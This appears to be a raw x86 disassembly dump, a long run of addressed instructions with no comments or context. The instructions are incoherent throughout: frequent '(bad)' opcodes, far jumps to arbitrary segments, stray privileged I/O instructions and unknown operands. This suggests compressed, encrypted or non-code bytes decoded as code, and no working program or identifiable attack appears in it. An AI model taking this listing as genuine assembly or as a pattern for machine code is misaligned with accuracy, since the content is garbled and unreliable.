  40cd12:	cmp    dh,BYTE PTR ds:0x0
  40cd18:	add    dl,cl
  40cd1a:	xchg   ebp,eax
  40cd1b:	cmp    ebx,DWORD PTR [ebx+ebx*2-0x393b9c54]
  40cd22:	or     DWORD PTR [eax],eax
  40cd24:	mov    dh,0x7a
  40cd26:	or     ch,al
  40cd28:	mov    edi,0x70fe940a
  40cd2d:	or     BYTE PTR [edx],0xff
  40cd30:	adc    al,0x11
  40cd32:	xchg   esp,eax
  40cd33:	adc    al,0xf1
  40cd35:	and    al,0xd5
  40cd37:	jmp    DWORD PTR [ecx+0x62]
  40cd3a:	or     bl,BYTE PTR [edi+0x27]
  40cd3d:	pop    eax
  40cd3e:	retf   
  40cd3f:	shl    ebp,0x76
  40cd42:	das    
  40cd43:	mov    eax,DWORD PTR [ebp+0x1a0ba8f0]
  40cd49:	inc    edi
  40cd4a:	sub    eax,0x61c92932
  40cd4f:	neg    DWORD PTR [esi+0xc]
  40cd52:	and    BYTE PTR [ecx+edx*2+0x71],0x89
  40cd57:	xlat   BYTE PTR ds:[ebx]
  40cd58:	mov    es:0x76f0ff8e,al
  40cd5e:	add    al,dh
  40cd60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd61:	in     eax,dx
  40cd62:	xchg   esp,eax
  40cd63:	std    
  40cd64:	mov    esp,0x317485fa
  40cd69:	adc    esp,esp
  40cd6b:	fsub   QWORD PTR [esi]
  40cd6d:	fadd   QWORD PTR [edi+0x54f5217c]
  40cd73:	jae    0x40cd40
  40cd75:	repz cmp eax,0x2865b9f4
  40cd7b:	add    BYTE PTR [ebx+0x0],dl
  40cd81:	add    BYTE PTR [edi+ebp*1+0x4dad4ff],cl
  40cd88:	inc    eax
  40cd89:	jmp    0xefc37287
  40cd8e:	dec    ebp
  40cd8f:	femms  
  40cd91:	out    0x3b,eax
  40cd93:	xchg   ebp,eax
  40cd94:	jg     0x40cdf2
  40cd96:	or     al,0x1
  40cd98:	jb     0x40cd41
  40cd9a:	sbb    ebp,edi
  40cd9c:	imul   esp,ecx,0xf57d9c
  40cda2:	cwde   
  40cda3:	push   es
  40cda4:	push   edi
  40cda5:	call   0x3e1934
  40cdaa:	dec    edi
  40cdab:	jnp    0x40ce01
  40cdad:	jmp    FWORD PTR [ecx]
  40cdaf:	adc    al,0x11
  40cdb1:	inc    eax
  40cdb2:	dec    esp
  40cdb3:	xchg   ebp,eax
  40cdb5:	pop    edi
  40cdb6:	jb     0x40cd8d
  40cdb8:	enter  0x69c3,0x85
  40cdbc:	jmp    0x4fd5:0x96ac8c51
  40cdc3:	(bad)  
  40cdc4:	push   DWORD PTR [esp+esi*1-0x2e]
  40cdc8:	mov    ebp,0x3ee9c8
  40cdcd:	push   esi
  40cdce:	xchg   ebx,eax
  40cdcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdd0:	adc    dl,BYTE PTR [ebx]
  40cdd2:	int3   
  40cdd3:	(bad)  
  40cdd4:	jg     0x40ce13
  40cdd6:	hlt    
  40cdd7:	fs inc ecx
  40cdd9:	add    ah,bl
  40cddb:	add    al,0x1a
  40cddd:	call   0x3e52ce
  40cde2:	dec    eax
  40cde3:	mov    edi,0x1172
  40cde8:	add    BYTE PTR [eax],al
  40cdea:	add    BYTE PTR [ebx+0x1fd59a94],bl
  40cdf0:	add    BYTE PTR [ebx+esi*4+0x5c6000c],ch
  40cdf7:	hlt    
  40cdf8:	fs inc ecx
  40cdfa:	add    BYTE PTR [ebp-0x5bea012f],bl
  40ce00:	mov    ?,WORD PTR [esi]
  40ce02:	add    dl,dl
  40ce04:	jl     0x40ce49
  40ce06:	cld    
  40ce07:	cld    
  40ce08:	jp     0x40ce7d
  40ce0a:	or     al,0x7
  40ce0c:	aam    0x7
  40ce0e:	push   0xffffff9c
  40ce10:	ret    0xfc43
  40ce13:	mov    esp,0xa4ffffff
  40ce18:	cdq    
  40ce19:	idiv   bh
  40ce1b:	push   ebx
  40ce1c:	into   
  40ce1d:	(bad)  
  40ce1e:	jne    0x40ce95
  40ce20:	mov    eax,ds:0x8b8d1495
  40ce25:	inc    edx
  40ce26:	add    al,dh
  40ce28:	push   0x81dd120f
  40ce2d:	adc    al,BYTE PTR [eax+0x75]
  40ce30:	dec    esp
  40ce31:	adc    BYTE PTR [edx+eax*2],cl
  40ce34:	scas   al,BYTE PTR es:[edi]
  40ce35:	push   ss
  40ce36:	adc    dh,BYTE PTR [ebp+0x1ebfd0a9]
  40ce3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce3d:	push   edx
  40ce3e:	add    BYTE PTR [edi+eiz*2],bh
  40ce41:	or     eax,DWORD PTR [eax]
  40ce43:	enter  0xa820,0x82
  40ce47:	or     ecx,edi
  40ce49:	sub    eax,DWORD PTR [eax]
  40ce4b:	jge    0x40cdf6
  40ce4d:	add    ch,al
  40ce4f:	add    BYTE PTR [eax],al
  40ce51:	add    BYTE PTR [eax],al
  40ce53:	add    dh,al
  40ce55:	ins    BYTE PTR es:[edi],dx
  40ce56:	xchg   esi,eax
  40ce57:	(bad)  
  40ce58:	in     al,dx
  40ce59:	fst    QWORD PTR [ebx+0x5b63584]
  40ce5f:	push   0x7d
  40ce61:	xor    al,0xf1
  40ce63:	adc    eax,DWORD PTR [ebx-0x4acdfd97]
  40ce69:	inc    ecx
  40ce6a:	test   BYTE PTR [eax],al
  40ce6c:	jne    0x40ce17
  40ce6e:	xor    DWORD PTR [ebx],esi
  40ce70:	mov    ch,0x6a
  40ce72:	sub    eax,0xbdd2488d
  40ce77:	inc    esp
  40ce78:	mov    ebp,0x308a68a8
  40ce7d:	xchg   ecx,eax
  40ce7e:	mov    DWORD PTR [edi],edi
  40ce80:	jge    0x40ce94
  40ce82:	inc    ecx
  40ce83:	fdiv   st(6),st
  40ce85:	gs push es
  40ce87:	mov    esi,DWORD PTR ds:0x95448ba1
  40ce8d:	cmovno edx,DWORD PTR [edx+edi*4]
  40ce91:	pop    ebp
  40ce92:	stos   BYTE PTR es:[edi],al
  40ce93:	add    DWORD PTR [ebp-0x57],esi
  40ce96:	add    al,BYTE PTR [ebp-0x76f6f34b]
  40ce9c:	xor    BYTE PTR [edx],al
  40ce9e:	int    0xbe
  40cea0:	mov    ecx,0x7503e99a
  40cea5:	add    ch,BYTE PTR [edx+0x20]
  40cea8:	imul   eax,DWORD PTR [ebx],0x35a40a7
  40ceae:	shl    BYTE PTR [ebp-0x7f176dae],1
  40ceb4:	or     dl,BYTE PTR [edi]
  40ceb6:	fld    QWORD PTR [edx+0x0]
  40cebc:	add    BYTE PTR [edx+0x4],cl
  40cebf:	fiadd  WORD PTR [eax+0x3e90343]
  40cec5:	(bad)  
  40cec6:	pop    ss
  40cec7:	in     eax,dx
  40cec8:	mov    cl,cl
  40ceca:	cli    
  40cecb:	arpl   WORD PTR [eax],bx
  40cecd:	sbb    al,0x9e
  40cecf:	fisttp WORD PTR [edx+0x3871faa1]
  40ced5:	cmp    DWORD PTR [edi-0x5],0x3947f99b
  40cedc:	xor    eax,DWORD PTR [edx]
  40cede:	sbb    ecx,esp
  40cee0:	xchg   esi,eax
  40cee1:	add    BYTE PTR [esi],0x66
  40cee4:	lock retf 0xa8f7
  40cee8:	add    esi,eax
  40ceea:	ret    0x80e5
  40ceed:	fadd   DWORD PTR [edx]
  40ceef:	jmp    0x7988b1f7
  40cef4:	add    al,0x49
  40cef6:	adc    dh,BYTE PTR [edx+0x40]
  40cef9:	add    DWORD PTR [eax+0x7b390f28],ecx
  40ceff:	mov    ds:0xe8b3cd8f,eax
  40cf04:	add    esi,DWORD PTR [ebp+0x7d]
  40cf07:	stos   DWORD PTR es:[edi],eax
  40cf08:	sti    
  40cf09:	icebp  
  40cf0a:	mov    ebx,0x3eff89c
  40cf0f:	pop    esp
  40cf10:	xor    BYTE PTR [ecx-0x7aeff9cc],cl
  40cf16:	xor    eax,0x63a9697
  40cf1b:	add    BYTE PTR [ebp-0x4a],ch
  40cf1e:	add    BYTE PTR [ebp+esi*1+0x0],al
  40cf25:	add    BYTE PTR [esi+0x2],dh
  40cf28:	add    BYTE PTR [edx-0x4e],dh
  40cf2b:	sahf   
  40cf2c:	test   BYTE PTR [ecx+0x5cfeea83],ch
  40cf32:	gs jl  0x40cf89
  40cf35:	fld    DWORD PTR [eax]
  40cf37:	push   ss
  40cf38:	adc    BYTE PTR [edx+0x3c],dh
  40cf3b:	test   eax,0x8fe0c3ed
  40cf40:	sub    DWORD PTR [ecx-0x166b7988],0x76
  40cf47:	add    cl,BYTE PTR [ebx+0x8025eef]
  40cf4d:	jmp    0x99b560c8
  40cf52:	in     al,dx
  40cf53:	mov    esi,0x7b7539fe
  40cf58:	inc    esp
  40cf59:	xchg   ebp,eax
  40cf5a:	xchg   edx,eax
  40cf5b:	push   ecx
  40cf5c:	jle    0x40cfad
  40cf5e:	outs   dx,BYTE PTR ds:[esi]
  40cf5f:	(bad)  
  40cf60:	(bad)  
  40cf61:	fmul   st(2),st
  40cf63:	cmc    
  40cf64:	aas    
  40cf65:	jmp    0xe967a38d
  40cf6a:	jbe    0x40cf83
  40cf6c:	jo     0x40cfc5
  40cf6e:	stos   BYTE PTR es:[edi],al
  40cf6f:	push   edx
  40cf70:	pop    ds
  40cf71:	fucomp st(3)
  40cf73:	jnp    0x40cfb9
  40cf75:	and    DWORD PTR [edx+0x51],ebx
  40cf78:	je     0x40cfed
  40cf7a:	mov    cl,0x7
  40cf7c:	jne    0x40cf6c
  40cf7e:	pushf  
  40cf7f:	add    edi,edi
  40cf81:	mov    edx,0x1d148fc2
  40cf86:	retf   0xffd0
  40cf89:	imul   eax,DWORD PTR [eax],0x0
  40cf8c:	add    BYTE PTR [eax],al
  40cf8e:	add    BYTE PTR [ecx-0x57d8afeb],bh
  40cf94:	add    DWORD PTR [eax+0x7501fe94],eax
  40cf9a:	out    0xf6,eax
  40cf9c:	or     eax,0x9d00f9
  40cfa1:	cmp    eax,0x8b9501ff
  40cfa6:	inc    ebp
  40cfa7:	push   0x8b4fffdc
  40cfac:	jmp    edi
  40cfae:	push   DWORD PTR [ecx+0x78]
  40cfb1:	adc    BYTE PTR [eax+0x5c],al
  40cfb4:	mov    ecx,0x44c0100
  40cfb9:	jne    0x3e4710
  40cfbf:	and    edx,ecx
  40cfc1:	repz dec esp
  40cfc3:	jae    0x40cfcb
  40cfc5:	add    bl,ch
  40cfc7:	daa    
  40cfc8:	mov    bl,0xc7
  40cfca:	add    DWORD PTR [edx+eax*1],0xf
  40cfce:	xchg   ebp,eax
  40cfcf:	fnstsw WORD PTR [ecx+eax*4]
  40cfd2:	loope  0x40cfbd
  40cfd4:	add    al,BYTE PTR [eax]
  40cfd6:	add    BYTE PTR [edi+0x798904c4],cl
  40cfdc:	jb     0x40cfc7
  40cfde:	add    al,0xe2
  40cfe0:	sar    dh,1
  40cfe2:	add    DWORD PTR [ebx+0x5ee8f000],ecx
  40cfe8:	dec    ecx
  40cfe9:	std    
  40cfea:	dec    DWORD PTR [edi-0x44ff0c08]
  40cff0:	aad    0x5a
  40cff2:	je     0x40cff4
  40cff4:	add    BYTE PTR [eax],al
  40cff6:	add    BYTE PTR [eax],al
  40cff8:	in     eax,0x76
  40cffa:	jae    0x40cff0
  40cffc:	dec    ebx
  40cffd:	mov    al,ds:0x40c1612
  40d002:	mov    al,BYTE PTR [ebp+0x3b]
  40d005:	mov    esp,0x10dc14c0
  40d00a:	cmc    
  40d00b:	je     0x40d07a
  40d00d:	jns    0x40d01a
  40d00f:	cmp    BYTE PTR [edi+0x5c330042],dl
  40d015:	adc    al,cl
  40d017:	je     0x40cfba
  40d019:	jp     0x40d02e
  40d01b:	xor    al,0x75
  40d01d:	in     al,0x3f
  40d01f:	add    BYTE PTR [ebx+ebp*4+0xe],bl
  40d023:	push   cs
  40d024:	xor    eax,0x7587c11a
  40d029:	cdq    
  40d02a:	add    bh,BYTE PTR [ebx]
  40d02c:	mov    ah,0xb
  40d02e:	xchg   edx,eax
  40d02f:	sub    BYTE PTR [ebp-0x7f754160],0xe1
  40d036:	mov    esi,0x38cc7542
  40d03b:	push   esi
  40d03c:	mul    BYTE PTR [ebp-0x6e]
  40d03f:	xor    dh,BYTE PTR ds:0x75874ed8
  40d045:	cdq    
  40d046:	add    al,BYTE PTR [ebp-0x75182ac4]
  40d04c:	mov    BYTE PTR [ebp+0x247542bd],cl
  40d052:	mov    edx,0x16996f82
  40d057:	or     DWORD PTR [ebp+0x3ab59c],esi
  40d05d:	add    BYTE PTR [eax],al
  40d05f:	add    BYTE PTR [eax],al
  40d061:	xor    al,0xeb
  40d063:	xchg   edi,eax
  40d064:	jmp    0x1112:0x688c246b
  40d06b:	add    al,0x0
  40d06d:	jne    0x40d00b
  40d06f:	nop
  40d070:	mov    cl,BYTE PTR ds:0x8c40d38e
  40d076:	bound  edi,QWORD PTR [ebx-0x1]
  40d079:	repnz cwde 
  40d07b:	push   eax
  40d07c:	xor    edi,DWORD PTR [esi+0x74e8025b]
  40d082:	rcl    DWORD PTR [edx+0x17d8f1fe],cl
  40d088:	inc    edx
  40d089:	(bad)  
  40d08a:	cmc    
  40d08b:	retf   
  40d08c:	retf   0x9936
  40d08f:	xchg   ecx,eax
  40d090:	add    al,0x7d
  40d092:	in     al,0x46
  40d094:	add    dh,ch
  40d096:	fstp   QWORD PTR [edi+edi*8]
  40d099:	std    
  40d09a:	add    ecx,ebp
  40d09c:	add    esi,DWORD PTR [ebp+0x3]
  40d09f:	(bad)  
  40d0a1:	scas   eax,DWORD PTR es:[edi]
  40d0a2:	inc    edx
  40d0a3:	jmp    0xb67423bf
  40d0a8:	fwait
  40d0a9:	in     eax,0xaa
  40d0ab:	add    eax,0xc545ff93
  40d0b0:	test   DWORD PTR [edi-0x55],0x7d751da9
  40d0b7:	jne    0x40d0a4
  40d0b9:	std    
  40d0ba:	add    eax,0x9a713270
  40d0bf:	out    dx,al
  40d0c0:	jmp    0x40d136
  40d0c2:	add    bh,BYTE PTR [edx]
  40d0c4:	add    DWORD PTR [eax],0x0
  40d0ca:	jecxz  0x40d096
  40d0cc:	ror    BYTE PTR [eax],0x6d
  40d0cf:	add    cl,ch
  40d0d1:	xor    ch,BYTE PTR [ebx-0x61cf5c87]
  40d0d7:	shr    ah,0x3
  40d0da:	out    dx,al
  40d0db:	cmp    ecx,ebx
  40d0dd:	cmp    edx,ecx
  40d0df:	shl    DWORD PTR [ebp-0x5078152a],1
  40d0e5:	pop    ss
  40d0e6:	cmp    BYTE PTR [ecx+0x19],0x0
  40d0ea:	out    dx,al
  40d0eb:	mov    ah,0x96
  40d0ed:	add    eax,0x43f31777
  40d0f2:	test   al,0xb8
  40d0f5:	into   
  40d0f6:	xor    eax,0x6d9e7a11
  40d0fb:	sbb    DWORD PTR [ecx+0x71c477d3],ebp
  40d101:	mov    esp,DWORD PTR [ecx-0x20]
  40d104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d105:	push   ds
  40d106:	lods   al,BYTE PTR ds:[esi]
  40d107:	shl    BYTE PTR [ebx+0x16],cl
  40d10a:	imul   ebx,DWORD PTR [edx-0x722c5334],0xe946c36c
  40d114:	jno    0x40d15c
  40d116:	gs jns 0x40d118
  40d119:	xor    BYTE PTR [ebx-0x73],bl
  40d11c:	das    
  40d11d:	jmp    0x4029:0xe83f7ec4
  40d124:	adc    BYTE PTR [ebp-0x1ebd875f],dl
  40d12a:	sbb    DWORD PTR [esp+eax*1+0x27],eax
  40d12e:	add    BYTE PTR [eax],al
  40d130:	add    BYTE PTR [eax],al
  40d132:	add    BYTE PTR [edi+0x0],bh
  40d135:	mov    ebp,DWORD PTR [esi]
  40d137:	inc    edi
  40d138:	sub    al,0xc3
  40d13a:	xchg   edi,eax
  40d13b:	add    edx,DWORD PTR [edx]
  40d13d:	adc    BYTE PTR [edx-0x87acb4a],bh
  40d143:	mov    ebp,eax
  40d145:	mov    ah,BYTE PTR [eax+0x7d]
  40d148:	jns    0x40d192
  40d14a:	in     eax,dx
  40d14b:	loope  0x40d0ff
  40d14d:	cmp    BYTE PTR [ebx+0x6d],dl
  40d150:	pop    ss
  40d151:	add    eax,0x74007bd7
  40d156:	hlt    
  40d157:	mov    dh,0x81
  40d159:	sar    ecx,0x31
  40d15c:	(bad)  
  40d15d:	jno    0x40d126
  40d15f:	and    BYTE PTR [ebp+0x5e],cl
  40d162:	(bad)  
  40d165:	rcr    cl,0x71
  40d168:	ret    
  40d169:	jmp    0x83eb:0xa807a397
  40d170:	cmp    ebp,DWORD PTR [eax-0x75029518]
  40d176:	das    
  40d177:	or     DWORD PTR [esi+0x3d29f5bf],eax
  40d17d:	call   0x447e1a
  40d182:	adc    al,0x8b
  40d185:	jne    0x40d17c
  40d187:	imul   eax,DWORD PTR [edi+0x10],0x119251
  40d18e:	jmp    0x4148e898
  40d193:	inc    edx
  40d194:	stos   BYTE PTR es:[edi],al
  40d195:	inc    BYTE PTR [eax]
  40d197:	add    BYTE PTR [eax],al
  40d199:	add    BYTE PTR [eax],al
  40d19b:	add    BYTE PTR [ebx],dh
  40d19d:	jae    0x40d213
  40d19f:	adc    al,0x24
  40d1a1:	xor    eax,0x7383ffd8
  40d1a6:	je     0x40d1c8
  40d1a8:	xor    al,0x2d
  40d1aa:	fdivr  st,st(7)
  40d1ac:	push   ebx
  40d1ad:	jae    0x40d223
  40d1af:	sub    BYTE PTR [ebp+eiz*1-0x137c0028],al
  40d1b6:	das    
  40d1b7:	push   esi
  40d1b8:	je     0x40d1ce
  40d1ba:	fcos   
  40d1bc:	jae    0x40d176
  40d1be:	add    al,0x2
  40d1c0:	dec    edi
  40d1c1:	xlat   BYTE PTR ds:[ebx]
  40d1c2:	push   esp
  40d1c3:	push   esi
  40d1c4:	fisttp DWORD PTR ds:0x86369f7
  40d1ca:	(bad)  
  40d1cb:	call   FWORD PTR [edi+eax*1+0x3d]
  40d1cf:	xor    al,0x27
  40d1d1:	inc    edi
  40d1d2:	add    BYTE PTR [ebx],dh
  40d1d4:	xor    DWORD PTR [ebx+0x75],esi
  40d1d7:	pop    eax
  40d1d8:	aad    0xa2
  40d1da:	out    0x7b,al
  40d1dc:	adc    eax,0x8bfffd73
  40d1e1:	mul    bh
  40d1e3:	jae    0x40d1ca
  40d1e5:	jb     0x40d1e4
  40d1e7:	jmp    FWORD PTR [ebx+0x1cfffe7f]
  40d1ed:	push   0x7303d966
  40d1f2:	xor    ebx,ebx
  40d1f4:	inc    ebp
  40d1f5:	jecxz  0x40d206
  40d1f7:	jbe    0x40d208
  40d1f9:	pcmpeqd mm1,QWORD PTR [edi+ebx*1]
  40d1fd:	jne    0x40d1e5
  40d1ff:	outs   dx,BYTE PTR ds:[esi]
  40d200:	add    BYTE PTR [eax],al
  40d202:	add    BYTE PTR [eax],al
  40d204:	add    BYTE PTR [ebx-0x70bc028e],al
  40d20a:	les    ebp,FWORD PTR [esi]
  40d20c:	cmp    eax,DWORD PTR [ebx+0x53ed7096]
  40d212:	jmp    0xfffd:0x591ae80b
  40d219:	jne    0x40d295
  40d21b:	retf   0x36ca
  40d21e:	cdq    
  40d21f:	jnp    0x40d218
  40d221:	lock fst DWORD PTR [esi]
  40d224:	push   ecx
  40d225:	out    dx,al
  40d226:	mov    dh,0xd6
  40d228:	retf   0x9936
  40d22b:	jnp    0x40d1f4
  40d22d:	sbb    al,0xe2
  40d22f:	jp     0x40d230
  40d231:	stos   BYTE PTR es:[edi],al
  40d232:	cdq    
  40d233:	jge    0x40d1c0
  40d235:	test   BYTE PTR [ecx-0x71],ah
  40d238:	(bad)  
  40d239:	call   0x81a2:0x9ffca18
  40d240:	call   0x436c42
  40d245:	xor    dl,BYTE PTR [esi]
  40d247:	xchg   ebp,eax
  40d248:	cmp    bh,BYTE PTR [ebp+0xd]
  40d24b:	fld    QWORD PTR [edx+esi*2+0x5d520116]
  40d252:	(bad)  
  40d253:	stos   DWORD PTR es:[edi],eax
  40d254:	(bad)  
  40d255:	(bad)  
  40d256:	cli    
  40d257:	shl    BYTE PTR [ebx],1
  40d259:	fadd   DWORD PTR cs:[ebx]
  40d25c:	jmp    0x40d2c5
  40d25e:	and    BYTE PTR [edi+0x4113c68],bh
  40d264:	add    BYTE PTR [ebp+0xb],dh
  40d267:	fmul   st,st(2)
  40d269:	add    BYTE PTR [eax],al
  40d26b:	add    BYTE PTR [eax],al
  40d26d:	add    BYTE PTR [esi+0x4d2d9a99],dh
  40d273:	pop    esp
  40d274:	mov    cs,WORD PTR [eax+0x42b9a168]
  40d27a:	jne    0x40d248
  40d27c:	sub    eax,0x3858be5d
  40d281:	mov    esp,DWORD PTR [ecx]
  40d283:	sbb    ah,BYTE PTR [eax+0x2997dab]
  40d289:	push   esi
  40d28a:	pop    edx
  40d28c:	jg     0x40d242
  40d28e:	adc    DWORD PTR [edi+ecx*4],0xad814dfe
  40d295:	mov    bh,0x74
  40d297:	add    ch,cl
  40d299:	cmp    cl,0x25
  40d29c:	bound  ecx,QWORD PTR [edi+0x3c331db]
  40d2a2:	fucom  st(3)
  40d2a4:	xor    cl,BYTE PTR [edi-0xd77a35]
  40d2aa:	div    BYTE PTR [eax+ebp*8]
  40d2ad:	add    esi,DWORD PTR [ebp+0x77]
  40d2b0:	cs xor al,0x0
  40d2b3:	test   esp,eax
  40d2b5:	mov    ch,BYTE PTR [ebx-0x72cc4776]
  40d2bb:	iret   
  40d2bc:	inc    ecx
  40d2bd:	(bad)  
  40d2be:	fwait
  40d2bf:	test   BYTE PTR [eax],ch
  40d2c1:	push   esi
  40d2c3:	int3   
  40d2c4:	out    0x3,eax
  40d2c6:	jne    0x40d2e0
  40d2c8:	ret    0x980
  40d2cb:	jbe    0x40d26d
  40d2cd:	fwait
  40d2ce:	ror    DWORD PTR [ecx-0x19],1
  40d2d1:	add    eax,DWORD PTR [eax]
  40d2d3:	add    BYTE PTR [eax],al
  40d2d5:	add    BYTE PTR [eax],al
  40d2d7:	inc    al
  40d2d9:	cwde   
  40d2da:	xor    cl,0x1e
  40d2dd:	loop   0x40d26d
  40d2df:	arpl   WORD PTR [ebx],si
  40d2e1:	ins    BYTE PTR es:[edi],dx
  40d2e2:	mov    BYTE PTR [esi-0x3d712a75],bh
  40d2e8:	call   0xc36b:0x8a4baadf
  40d2ef:	jae    0x40d36f
  40d2f1:	aam    0x4
  40d2f3:	jne    0x40d2f7
  40d2f5:	fs mov dh,cl
  40d2f8:	mov    ebp,DWORD PTR [ebp-0x4764572]
  40d2fe:	scas   eax,DWORD PTR es:[edi]
  40d2ff:	test   BYTE PTR [edx-0x17],al
  40d302:	and    BYTE PTR [edx],0x8a
  40d305:	in     eax,0x87
  40d307:	adc    BYTE PTR [ebx],al
  40d309:	jmp    0x74077211
  40d30e:	sbb    BYTE PTR ds:0xbd25912b,ch
  40d314:	add    eax,DWORD PTR [eax]
  40d316:	jmp    0xf4cd9aa7
  40d31b:	inc    esi
  40d31c:	xor    eax,ebp
  40d31e:	ret    0x22e
  40d321:	add    bl,dl
  40d323:	test   al,0x76
  40d325:	je     0x40d380
  40d327:	sahf   
  40d328:	call   0x2f53:0x271914f
  40d32f:	sub    eax,0xbb95ff89
  40d334:	dec    edi
  40d335:	inc    esp
  40d336:	ss data16 ja 0x40d37e
  40d33a:	and    DWORD PTR [eax],eax
  40d33c:	add    BYTE PTR [eax],al
  40d33e:	add    BYTE PTR [eax],al
  40d340:	data16 sbb al,0xa
  40d343:	ret    0x6f5
  40d346:	fcom   QWORD PTR [ecx]
  40d348:	outs   dx,DWORD PTR ds:[esi]
  40d349:	popf   
  40d34a:	(bad)  
  40d34b:	push   ss
  40d34c:	popa   
  40d34d:	sub    eax,DWORD PTR [ebx-0x74068eef]
  40d353:	aas    
  40d354:	jbe    0x40d358
  40d356:	add    BYTE PTR [ebp+ebp*8+0x2d],ch
  40d35a:	stc    
  40d35b:	test   BYTE PTR [eax],0x39
  40d35e:	push   0xffffffee
  40d360:	jmp    0x4fc0:0xdc39b03e
  40d367:	fisub  WORD PTR [edx+0x21]
  40d36a:	adc    ch,BYTE PTR [ecx]
  40d36c:	jns    0x40d3eb
  40d36e:	imul   DWORD PTR [edx-0x8]
  40d371:	xchg   DWORD PTR [esi],ecx
  40d373:	ins    DWORD PTR es:[edi],dx
  40d374:	retf   0xfe89
  40d377:	jmp    0xb09c5237
  40d37c:	add    BYTE PTR [eax+0x37d414f],cl
  40d382:	add    cl,ch
  40d384:	mov    ds:0xe89c6b7e,eax
  40d389:	xchg   DWORD PTR [edi-0x26],ecx
  40d38c:	call   0xe16560bf
  40d391:	cmp    BYTE PTR [ebp+0x4e525100],cl
  40d397:	jmp    DWORD PTR [ecx]
  40d399:	std    
  40d39a:	adc    DWORD PTR [eax-0x24],eax
  40d39d:	jg     0x40d35d
  40d39f:	je     0x40d41d
  40d3a1:	or     DWORD PTR [esp+ebp*2+0x0],eax
  40d3a8:	add    BYTE PTR [ecx+0x77],bl
  40d3ab:	std    
  40d3ac:	xchg   bp,ax
  40d3ae:	xor    DWORD PTR [ebx-0x3],ebp
  40d3b1:	sub    esi,DWORD PTR [edi+0x72]
  40d3b4:	adc    al,0xb2
  40d3b6:	xor    DWORD PTR [esi],0x69ff012f
  40d3bc:	pop    esp
  40d3bd:	adc    eax,0x1f0888df
  40d3c2:	mov    esi,0xb4a56600
  40d3c7:	jae    0x40d3b5
  40d3c9:	emms   
  40d3cb:	push   DWORD PTR [edx+esi*4+0x7]
  40d3cf:	test   BYTE PTR [ecx+ebp*2+0x77],ch
  40d3d3:	std    
  40d3d4:	push   eax
  40d3d5:	sub    DWORD PTR [ecx+0x777bfb62],eax
  40d3db:	dec    esi
  40d3dc:	lea    edx,[ecx]
  40d3de:	retf   0xfff6
  40d3e1:	imul   edx,esp,0xffffffe7
  40d3e4:	sbb    al,BYTE PTR [esi+0xc85fd75]
  40d3ea:	lock sbb DWORD PTR [ebp-0x93037],ecx
  40d3f1:	sub    ebp,DWORD PTR [ebx+0x4]
  40d3f4:	lea    ebp,[ecx+0x3bfffce7]
  40d3fa:	or     edx,DWORD PTR [eax+ecx*1+0x24]
  40d3fe:	pushf  
  40d3ff:	(bad)  
  40d400:	call   FWORD PTR [eax+eax*4]
  40d403:	mov    esi,0x43764974
  40d408:	dec    DWORD PTR [eax+edi*8+0xfafe]
  40d40f:	add    BYTE PTR [eax],al
  40d411:	add    BYTE PTR [ebx],cl
  40d413:	sub    BYTE PTR [ecx],0xff
  40d416:	jne    0x40d488
  40d418:	mov    ebx,DWORD PTR [esi-0x52]
  40d41b:	xlat   BYTE PTR ds:[ebx]
  40d41c:	mov    edx,0x359979c1
  40d421:	mov    ecx,DWORD PTR [ecx]
  40d423:	sbb    ebx,DWORD PTR [edi+0x299766b]
  40d429:	push   esi
  40d42a:	inc    edx
  40d42b:	add    ecx,edx
  40d42d:	mov    WORD PTR [eax+0x35],gs
  40d430:	sub    ecx,DWORD PTR [ecx-0x787d2c0]
  40d436:	fisttp QWORD PTR [ebx+edx*2+0x0]
  40d43a:	jne    0x40d460
  40d43c:	lds    ecx,FWORD PTR [edi+0x2a]
  40d43f:	push   cs
  40d440:	xchg   BYTE PTR [ebx+0x4f8bc8b9],dl
  40d446:	popf   
  40d447:	push   cs
  40d448:	stos   BYTE PTR es:[edi],al
  40d449:	(bad)  
  40d44a:	stos   BYTE PTR es:[edi],al
  40d44b:	push   ds
  40d44c:	ret    
  40d44d:	push   cs
  40d44e:	stc    
  40d44f:	and    eax,0xac750003
  40d454:	xchg   esp,eax
  40d455:	push   ebp
  40d456:	sbb    eax,0x75000319
  40d45b:	add    DWORD PTR [eax],0x56
  40d45e:	setp   BYTE PTR [edx]
  40d461:	add    BYTE PTR [ebp-0x67],dh
  40d464:	inc    edx
  40d465:	(bad)  
  40d466:	clc    
  40d467:	and    al,0x8f
  40d469:	(bad)  
  40d46a:	push   0x69
  40d46c:	mov    edx,DWORD PTR [eiz*8-0x13ffbd75]
  40d473:	fld    QWORD PTR [edi+0x82]
  40d479:	add    BYTE PTR [eax],al
  40d47b:	dec    ebp
  40d47c:	mov    al,0xfa
  40d47e:	cmp    esp,0xffffff98
  40d481:	add    al,BYTE PTR [eax]
  40d483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d484:	xor    ecx,ebx
  40d486:	mov    eax,?
  40d488:	and    al,0x8a
  40d48a:	(bad)  
  40d48b:	xor    dh,cl
  40d48d:	aad    0xda
  40d48f:	sbb    eax,0x75005162
  40d494:	add    bh,BYTE PTR [edi]
  40d496:	jg     0x40d4f9
  40d498:	push   cs
  40d499:	sti    
  40d49a:	inc    ebx
  40d49b:	jne    0x40d512
  40d49d:	sub    ecx,DWORD PTR [edx+edi*4+0x75052647]
  40d4a4:	add    bl,BYTE PTR [esi]
  40d4a6:	jns    0x40d499
  40d4a8:	gs jle 0x40d436
  40d4ab:	repz xor DWORD PTR [esi+0x11],esi
  40d4af:	jmp    0x22c26b3a
  40d4b4:	push   cs
  40d4b5:	sbb    eax,0xd38a59cd
  40d4ba:	(bad)  
  40d4bc:	add    al,0x5d
  40d4be:	add    al,0x41
  40d4c0:	jecxz  0x40d50f
  40d4c2:	adc    ecx,ecx
  40d4c4:	xchg   bl,bl
  40d4c6:	xchg   edi,eax
  40d4c7:	fs inc edx
  40d4c9:	jmp    0x30bc49eb
  40d4ce:	jns    0x40d501
  40d4d0:	mov    bl,BYTE PTR [eax+0x1d0ca232]
  40d4d6:	mov    esp,DWORD PTR [ecx]
  40d4d8:	xchg   BYTE PTR ds:0x9cc1f9b2,bl
  40d4de:	cld    
  40d4df:	add    BYTE PTR [eax],al
  40d4e1:	add    BYTE PTR [eax],al
